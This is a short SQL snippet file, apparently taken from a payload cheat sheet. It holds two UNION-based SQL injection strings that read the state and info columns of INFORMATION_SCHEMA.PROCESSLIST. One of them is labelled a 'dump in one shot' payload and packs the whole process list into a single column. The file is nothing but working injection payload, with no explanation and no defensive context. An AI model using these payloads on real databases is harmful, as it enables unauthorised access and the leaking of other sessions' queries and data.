---
id: 89bc737a-9ec3-4729-ad7c-6829d068a6e7
type: code
language: SQL
verified: false
created_at: '2023-04-06T03:56:34.743525+00:00'
updated_at: '2023-04-10T20:22:53.127962+00:00'
---

# Code Snippet 89bc737a

**Language**: SQL

```sql
union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #

-- Dump in one shot example for the table content.
union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```
